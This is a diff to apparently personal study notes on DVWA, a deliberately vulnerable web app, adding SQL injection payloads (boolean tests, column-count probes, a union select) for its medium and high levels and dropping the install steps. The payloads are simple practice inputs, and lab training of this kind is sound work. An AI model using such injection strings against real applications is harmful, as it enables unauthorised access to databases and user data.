@@ -1,15 +1,4 @@
 # DVWA
-
-## Install
-```bash
-dnf -y install mariadb-server php-fpm nginx php php-gd
-git clone https://github.com/digininja/DVWA.git
-mv DVWA dvwa
-cd dvwa/config
-/bin/cp -rf config.inc.php.dist config.inc.php
-vim config.inc.php # edit config.inc.php file and set database and key
-```
-
 ## SQL Injection
 ### Level Low
 ```sql
@@ -41,4 +30,17 @@ vim config.inc.php # edit config.inc.php file and set database and key
   -- First name: smithy
   -- Surname: 5f4dcc3b5aa765d61d8327deb882cf99
 ```
-### Level Medium
+### Level Medium Security
+```sql
+-- Use Burp Suite change post data
+id=1' and 1=1%23
+id=1' ordery by 2%23
+id=1' union select 1,2%23
+```
+
+### Level High Security
+```sql
+1' and 1=1#
+1' and 1=2#
+# You can see error means wo can inject sql here :P
+```
